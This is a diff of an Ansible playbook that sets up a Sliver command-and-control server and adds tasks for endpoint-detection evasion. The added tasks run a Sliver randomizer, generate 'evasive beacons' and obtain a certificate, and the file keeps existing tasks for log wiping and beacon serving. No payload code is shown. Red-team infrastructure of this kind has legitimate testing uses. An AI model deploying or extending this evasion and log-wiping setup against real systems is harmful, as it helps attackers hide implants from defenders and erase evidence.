@@ -1,5 +1,5 @@
 ---
-# Common tasks for configuring C2 server
+# Common tasks for configuring C2 server with EDR evasion
 # Shared across all providers
 
 - name: Update apt cache
@@ -53,6 +53,7 @@
       - dovecot-sieve
       - dovecot-managesieved
       - yq
+      - build-essential
     state: present
 
 - name: Create directories for operational scripts
@@ -70,22 +71,59 @@
 - name: Copy operational scripts
   copy:
     src: "{{ item }}"
-    dest: "/opt/c2/{{ item }}"
+    dest: "/opt/c2/{{ item | basename }}"
     mode: '0700'
     owner: root
     group: root
   with_items:
-    - clean-logs.sh
-    - secure-exit.sh
-    - serve-beacons.sh
+    - ../files/clean-logs.sh
+    - ../files/secure-exit.sh
+    - ../files/serve-beacons.sh
+    - ../files/sliver_randomizer.sh
+    - ../files/generate_evasive_beacons.sh
 
-- name: Create Sliver service file
+- name: Remove standard Sliver if installed
+  apt:
+    name: sliver
+    state: absent
+  ignore_errors: yes
+
+- name: Stop standard Sliver service if running
+  systemd:
+    name: sliver
+    state: stopped
+    enabled: no
+  ignore_errors: yes
+
+- name: Run Sliver randomization for EDR evasion
+  shell: /opt/c2/sliver_randomizer.sh
+  args:
+    creates: /opt/c2/sliver-profiles/evasive-template.json
+  register: randomization_result
+
+- name: Create custom Sliver service file
   template:
     src: "../templates/sliver-server.service.j2"
     dest: /etc/systemd/system/sliver.service
     mode: '0644'
     owner: root
     group: root
+
+- name: Enable and start custom Sliver service
+  systemd:
+    name: sliver
+    state: started
+    enabled: yes
+    daemon_reload: yes
+
+- name: Wait for Sliver to initialize
+  pause:
+    seconds: 10
+
+- name: Generate evasive beacons
+  shell: /opt/c2/generate_evasive_beacons.sh {{ ansible_host }}
+  args:
+    creates: /opt/beacons/reference.txt
 
 - name: Set up cron job for log cleaning if zero-logs enabled
   cron:
@@ -103,6 +141,13 @@
     if ! pgrep -f "/opt/c2/serve-beacons.sh" > /dev/null; then
       nohup /opt/c2/serve-beacons.sh > /dev/null 2>&1 &
     fi
+
+- name: Install Let's Encrypt certificate if domain specified
+  shell: |
+    certbot certonly --standalone -d {{ c2_subdomain }}.{{ domain }} --non-interactive --agree-tos -m {{ letsencrypt_email }}
+  args:
+    creates: /etc/letsencrypt/live/{{ c2_subdomain }}.{{ domain }}/fullchain.pem
+  when: domain != "example.com"
 
 # Include integrated tracker tasks if requested
 - name: Include integrated tracker setup
